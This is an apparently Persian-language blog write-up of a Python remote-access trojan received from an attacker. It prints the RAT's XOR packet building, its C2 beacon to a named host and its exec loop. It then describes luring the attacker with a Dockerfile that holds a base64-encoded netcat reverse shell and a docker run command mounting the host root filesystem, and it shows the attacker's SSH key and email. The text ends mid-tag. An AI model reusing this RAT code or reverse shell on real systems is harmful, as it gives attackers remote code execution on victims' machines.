+</span></span><span class=line><span class=cl>        <span class=c1>#szCodeArr[0] = szCode</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1001</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>exec</span><span class=p>(</span><span class=n>szCode</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1002</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>kbeps</span> <span class=o>=</span> <span class=s2>&#34;weeg&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>تابع xor_encrypt_decrypt یک XOR با کلید ۱۶‌بایتی انجام می‌ده؛ این همون لایه‌ی بیرونی رمزگذاری/رمزگشایی هس. تابع get_bytes_from_unicode متن رو قبل از XOR به UTF-16LE تبدیل می‌کنه. تابع encrypt_decrypt یه عملیات XOR تک‌بایتی با کلید ثابت ۱۲۳ است و روی بدنه‌ی دستور در جواب C2 اعمال می‌شه، یعنی جواب‌ها دو لایه XOR دارند: بیرونی با کلید ۱۶‌بایتی، درونی با ۱۲۳. block_copy هم نقشش اینه که از بدنه‌ی پاسخ، داده‌ها رو (کد دستور، کامند، هدر و …) بر اساس آفست شون استخراج کنه.</p><h3 id=لایهی-انتقال><strong>لایه‌ی انتقال</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>HTTP_POST</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>user_agent</span> <span class=o>=</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>encoded_data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span> <span class=o>=</span> <span class=n>ssl</span><span class=o>.</span><span class=n>_create_unverified_context</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>n_request</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>encoded_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>n_request</span><span class=o>.</span><span class=n>add_header</span><span class=p>(</span><span class=s1>&#39;User-Agent&#39;</span><span class=p>,</span> <span class=n>user_agent</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>n_request</span><span class=p>,</span> <span class=n>context</span><span class=o>=</span><span class=n>context</span><span class=p>,</span> <span class=n>timeout</span> <span class=o>=</span> <span class=mi>60</span><span class=p>)</span> <span class=k>as</span> <span class=n>response</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>درخواست‌ها با urllib ارسال می‌شن. اعتبارسنجی TLS عمداً خاموش شده تا گواهی‌های نامعتبر(امضا نشده) با خطا مواجه نشه. User-Agent هم همیشه ثابته.</p><h3 id=ساخت-پکت-برای-ارتباط-با-c2><strong>ساخت پکت برای ارتباط با c2</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>MakeRequestPacket</span><span class=p>(</span><span class=n>szContents</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>   <span class=n>szCID</span> <span class=o>=</span> <span class=s2>&#34;FD429DEABE&#34;</span>
+</span></span><span class=line><span class=cl>   <span class=n>szStep</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r\n\t\t</span><span class=s2>Step1 : KeepLink(P)</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>   <span class=n>lszRequest</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>   <span class=n>lpRequest</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>   <span class=n>lpRequestEnc</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>szContents</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>       <span class=n>szData</span> <span class=o>=</span> <span class=n>szStep</span> <span class=o>+</span> <span class=n>szPCode</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>szComputerName</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>szContents</span>
+</span></span><span class=line><span class=cl>   <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>       <span class=n>szData</span> <span class=o>=</span> <span class=n>szContents</span>
+</span></span><span class=line><span class=cl>   <span class=n>lszRequest</span> <span class=o>=</span> <span class=s2>&#34;id=&#34;</span> <span class=o>+</span> <span class=n>szCID</span> <span class=o>+</span> <span class=s2>&#34;&amp;oid=&#34;</span> <span class=o>+</span> <span class=n>szObjectID</span> <span class=o>+</span> <span class=s2>&#34;&amp;data=&#34;</span>
+</span></span><span class=line><span class=cl>   <span class=n>lpRequest</span> <span class=o>=</span> <span class=n>get_bytes_from_unicode</span><span class=p>(</span><span class=n>szData</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=n>lpRequestEnc</span> <span class=o>=</span> <span class=n>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>lpRequest</span><span class=p>,</span><span class=n>Key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=n>szb64Data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>lpRequestEnc</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>   <span class=n>lszRequest</span> <span class=o>+=</span> <span class=n>szb64Data</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>lszRequest</span>
+</span></span></code></pre></td></tr></table></div></div><p>مقدار szCID احتمالا به عنوان شناسه‌ی کمپین استفاده می‌شه که همیشه ثابت و برابر با FD429DEABE و همراه با oid (شناسه‌ی ۱۲حرفی) و data ارسال می‌شه. وقتی szContents خالی باشه، اسکریپت برای heartbeet و یا معرفی اولیه‌ رشته‌ی Step1 : KeepLink(P) رو به‌ همراه اطلاعات سیستم (szPCode/szComputerName/) پر می‌کنه. این متن به UTF-16LE تبدیل می‌شه و با کلید ۱۶‌بایتی XOR میشه و درنهایت Base64 انکد می‌شه.
+خروجی نهایی بدنه‌ی POST هست به فرم زیر ایجاد میشه:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>id</span><span class=o>=</span><span class=n>FD429DEABE</span><span class=o>&amp;</span><span class=n>oid</span><span class=o>=&lt;</span><span class=mi>12</span><span class=n>char</span><span class=o>&gt;&amp;</span><span class=n>data</span><span class=o>=&lt;</span><span class=n>Base64</span><span class=p>(</span><span class=n>XOR_16</span><span class=p>(</span><span class=n>UTF</span><span class=o>-</span><span class=mi>16</span><span class=n>LE</span><span class=p>(</span><span class=n>payload</span><span class=p>)))</span><span class=o>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=حلقهی-فرماندهی-و-کنترل-c2-loop><strong>حلقه‌ی فرماندهی و کنترل (C2 Loop)</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>szContents</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpCmdID</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpDataLen</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>nCMDID</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>nDataLen</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>nLen</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>szCode</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>szCodeArr</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;new string&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>szRequest</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>szResponse</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpContent</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpData</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpContentEnc</span> <span class=o>=</span><span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>szRequest</span> <span class=o>=</span> <span class=n>MakeRequestPacket</span><span class=p>(</span><span class=n>szContents</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szContents</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>szResponse</span> <span class=o>=</span> <span class=n>HTTP_POST</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>szRequest</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szResponse</span> <span class=o>=</span> <span class=n>szResponse</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;+&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>szResponse</span> <span class=o>==</span> <span class=s2>&#34;Succeed!&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpContentEnc</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>szResponse</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpContent</span> <span class=o>=</span> <span class=n>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>lpContentEnc</span><span class=p>,</span> <span class=n>Key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>lpCmdID</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>lpDataLen</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>nCMDID</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpCmdID</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>nDataLen</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpDataLen</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>lpData</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=n>encrypt_decrypt</span><span class=p>(</span><span class=n>lpData</span><span class=p>,</span> <span class=mi>123</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szCode</span> <span class=o>=</span> <span class=n>lpData</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>#szCodeArr[0] = szCode</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1001</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>exec</span><span class=p>(</span><span class=n>szCode</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1002</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>kbeps</span> <span class=o>=</span> <span class=s2>&#34;weeg&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>در هر چرخه، بسته ی درخواست ساخته و به https://searchbox[.]info/prefer.php ارسال میشه. پاسخ دریافتی اگه دقیقا «Succeed!» باشه، نقش زنده نگه داشتن کانکشن رو داره و بدافزار ۲۰ ثانیه مکث می کنه و دوباره یه درخواست به سرور میفرسته. در غیر اینصورت، ابتدا از Base64-decoding، لایه ی بیرونی داده‌ی دریافت شده با XOR کلید ۱۶بایتی باز می شه. </p><p>فرمت کلی پاسخ سرور این شکلیه:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>b64</span><span class=p>(</span> <span class=n>XOR16</span><span class=p>(</span> <span class=p>[</span> <span class=mi>4</span><span class=n>B</span> <span class=n>CMDID</span><span class=o>|</span><span class=n>LE</span> <span class=p>][</span> <span class=mi>4</span><span class=n>B</span> <span class=n>DATALEN</span><span class=o>|</span><span class=n>LE</span> <span class=p>][</span> <span class=n>DATALEN</span> <span class=n>bytes</span> <span class=n>payload</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>هدر پاسخ ۸ بایت طول داره: ۴ بایت اول شناسه ی دستور (nCMDID) و ۴ بایت بعدی طول داده (nDataLen). بعد به اندازه ی nDataLen بایت داده بعد از هدر برداشته می شه، با کلید  ۱۲۳ <strong>(<strong>0x7B</strong>)</strong>  XOR  میشه و به UTF-8 تبدیل میشه. خروجی هم باید کد پایتون باشه. اگر nCMDID برابر 1001 باشد، همین کد با exec روی سیستم اجرا میشه. اگر 1002 باشد، ۶۰ ثانیه مکث میکنه. </p><h3 id=جمع-بندی><strong>جمع بندی</strong></h3><p>این بدافزار یه RAT مینیمال، اما واقعا کار راه انداز هست. با هر بار بیکون زدن(beacon)، یه بسته ی متنی شامل شناسه‌ی کمپین، شناسه‌ی ۱۲حرفی کلاینت و داده‌ی رمزشده به C2 می‌فرسته. پاسخ رو توی دو لایه XOR باز می‌کنه و در صورت نیاز، متن دریافتی رو مستقیما با exec اجرا می‌کنه. نبود ماژول های جانبی به معنی محدود بودن تهدید نیست؛ چون با یه دستور 1001، هر قابلیتی میشه در لحظه روی عامل قربانی تزریق و اجرا بشه. خلاصه به محض برقراری ارتباط موفق، مهاجم اختیار کامل اجرای کد روی سیستم رو داره. </p><p align=center><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/like.jpg width=400 height=398 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/like_hu_98ea953ac627dd20.jpg 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/like_hu_55a81af8464e6b36.jpg 1024w" loading=lazy class=gallery-image data-flex-grow=100 data-flex-basis=241px></p></p><p>خب اینجا من دیگه یه شناخت کافی از اسکریپت و نقشه‌ی مهاجم دستم اومد. یکمی فکر کردم که چیکارا میشه کرد و اصلا چقدر دیگه روش وقت بزارم. به نظرم رسید خوبه که سعی کنم مهاجم رو توی تله بندازم و یکمی گوش مالیش بدم. پس یه نقشه کشیدم، با همون ایده‌ای که مهاجم اومد سراغ‌مون برم سراغش. نقشم این بود بهش بگم که آقا من کار رو آماده کردم ولی به بهونه‌ی پایدار نبودن اینترنت ایران، فیلترینگ و کمی ساده لوح جلوه دادن خودم بهش بگم حاجی بیا وصل شو خودت به سیستمم تست بگیر. بهش بگم کلید sshت رو بده و من بزارم توی سیستم توهم بفرما بیا داخل😂. </p><h2 id=بازی-برعکس-فریب-مهاجم-با-dockerfile><strong>بازی برعکس: فریب مهاجم با Dockerfile</strong></h2><p>از اینجا به بعد یکی از بچه های تیم رو صدا کردم که باهم بریم سراغش. تصمیم گرفتیم از همون ترفند خودش علیه خودش استفاده کنیم. چون از ما Dockerfile خواسته بود، یک ایمیج درست کردیم که در واقع به محض اجرا به ما reverse shell می داد.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span> rm /tmp/f 2&gt;/dev/null<span class=p>;</span> mkfifo /tmp/f<span class=p>;</span> cat /tmp/f <span class=p>|</span> sh -i 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> nc 1.2.3.4 <span class=m>3000</span> &gt; /tmp/f<span class=p>;</span> sleep 5<span class=p>;</span> <span class=k>done</span>
+</span></span></code></pre></td></tr></table></div></div><p>منیفست ایمیج‌مون این شکلی شد:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Dockerfile
+</span></span><span class=line><span class=cl>FROM alpine:latest
+</span></span><span class=line><span class=cl>RUN apk add --no-cache netcat-openbsd
+</span></span><span class=line><span class=cl>ENV KEY=&#34;d2hpbGUgdHJ1ZTsgZG8gcm0gL3RtcC9mIDI+L2Rldi9udWxsOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgc2ggLWkgMj4mMSB8IG5jIDEuMi4zLjQgMzAwMCA+IC90bXAvZjsgc2xlZXAgNTsgZG9uZQ==&#34;
+</span></span></code></pre></td></tr></table></div></div><p>همین طور این ایمیج باید طوری ران می شد که موقع اجرا کل مسیر <strong>"/"</strong> سیستم عامل قربانی رو هم داخل کانتینر مونت می کرد، یعنی عملاً ما دسترسی مستقیم به فایل سیستمش پیدا می کردیم.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40
+</span></span></code></pre></td></tr></table></div></div><p>اگه دقت کنید اسم ایمیج رو طوری انتخاب کردیم که شبیه یه آدرس آیپی شده <strong>84.26.14.40</strong> تا فکر کنه واقعا داره به این ماشین وصل میشه! این آیپی رو همین طوری رندوم انتخاب کردیم.</p><p>خلاصه توی مکالممون توی تلگرام خرش کردیم؛ من براش نوشتم:
+<kbd>«آقا اینترنت ایران داغونه، بیا مستقیم روی سیستم من وصل شو، خودت خروجی پروژه رو بررسی کن.»</kbd></p><p>اونور اون هم حسابی ذوق کرده بود و کلید عمومی SSH خودش رو فرستاد:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCgIROy2BYmbTwhp/TWnkmFHIigCrioS6Wl3yd2n8KNm7mB/D6Ino0VqdT92LRD8ryaIFEYKKPoBt7giDMjrITql3gx8apIk8SM+3+ub6cEiNJZqyM9emRQSl4BKYXV5FqSdRlGGY49+IQLl2B+jh7Gc3wpJTI5Aot9zn+hEKnB+i6Tb+n+U6+hep6QYtCIAL+gM+JKYui1L13klf/CXxy7PWt6nOnFih/PwxKAWBrE4O96/fFfSyBiXt1iiG0hY/FyM2uD9EHg2H1oWxmBhHVtByehYZmHFyi7kpCkLONXwSA4vAUqGPk2VB8Vvf3leb1yJHtEoIDAf9r//cWV2fkAMD8vuZThLJD4yBpYX24DgvvK/ZNVcakSTTvog2Tv0V347iVLufyaPgIaCKls3m0mjaSd0wJTaB6RaEz388ii98NHF1WAaXS06K8pJ//94eD1vVb6sJh9tqJupbVpieUzRSZVTGK7nyxg0edC9H56NHoaEiEXL2Vvs5/fDpTQbwLtQRRRQnVdcrF4/W/n/XopWFsHOfl5E/xlesIbVtWWekLx8sf447U8osjiXnY8FJobdPv70gknORRjEyLfy0J7y99JRH26yJTcssw8o1wGQdFm8DtmUgxDT3q3mfigtYyEAk6irIN0chqDjGWIiUUGY4pOUNM5wSWdypGUZ9oLqw<span class=o>==</span> harryking940610@gmail.com
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/pub.png width=1024 height=1332 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/pub_hu_c3c2754fcbcf593a.png 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/pub_hu_d69ee3865e5a0428.png 1024w" loading=lazy alt="مهاجم کلید عمومی sshش رو فرستاد" class=gallery-image data-flex-grow=76 data-flex-basis=184px></p><p>برای اینکه دفعه‌ی اول بتونه وصل شه و اعتمادش جلب شه تصمیم گرفتیم روی سندباکس‌مون یه SSH اکسس موقت ولی توی هانی‌پات بهش بدیم. ما هم هانی‌پات <a class=link href=https://github.com/cowrie/cowrie target=_blank rel=noopener>Cowrie</a> بالا آوردیم. یارو وقتی سعی می‌کرد وارد شه (5.223.53[.]161 ایپیش این بود)، فکر می‌کرد واقعاً روی ماشین من هست! </p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cowrie.png width=1024 height=384 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cowrie_hu_c2f1c244fe2301fc.png 480w, 